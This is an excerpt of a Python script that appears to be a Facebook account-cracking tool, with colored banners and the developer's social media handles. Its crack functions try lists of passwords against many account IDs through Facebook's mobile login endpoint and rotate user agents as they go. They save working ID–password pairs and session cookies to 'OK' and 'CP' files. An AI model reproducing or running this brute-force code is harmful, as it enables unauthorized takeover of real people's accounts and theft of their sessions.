...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/YUBRAJ.XWD.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\__|  \__|\________|\__|  \__| \______/ 
  ...
  \x1b[38;5;50m 
\33[1;92m╔═════════════════════════════════════════════╗
\33[1;92m║ DEVELOPER    \33[1;91m ❂     \x1b[38;5;48mYB\•/YB\33[1;92m                 ║
\33[1;92m║ FACEBOOK \33[1;91m     ❂     \x1b[38;5;208m𝘎𝘰𝘥 YUBRAJ-XWD\33[1;92m              ║
\33[1;92m║ GITHUB     \33[1;91m   ❂    \x1b[38;5;47m YUBRAJ3987\33[1;92m               ║
\33[1;92m║ TEAM    \33[1;91m      ❂  \x1b[38;5;47m   YUBRAJ\33[1;92m              ║
\33[1;92m╠═════════════════════════════════════════════╣
...
\33[1;92m╚═════════════════════════════════════════════╝
\33[1;92m╔═════════════════════════════════════════════╗
\33[1;92m║ FB GROUP : HERO-HONI-3.6  ║
\33[1;92m╚═════════════════════════════════════════════╝"""
os.system('clear')
print(logo)
...
print('\033[0;97m═════════════════════════════════════════════')
os.system('espeak -a 300 " Welcome,   to,  YUBRAJ,  XWD,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[YUBRAJ•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[YUBRAJ-2F] {idf} • {pw}')
                ...
                print(f'\r\x1b[38;5;208m[YUBRAJ-Ok💚] {idf} • {pw}\n\033[0;93m[💙] COOKIES • \033[1;96m{kuki} ')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Ok,  YUBRAJ,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[YUBRAJ-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}•YUBRAJ-2F] {idf} • {pw}')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\x1b[38;5;208m[{time.strftime("%H:%M")}•YUBRAJ-OK] {idf} • {pw} ')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Ok,  YUBRAJ,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
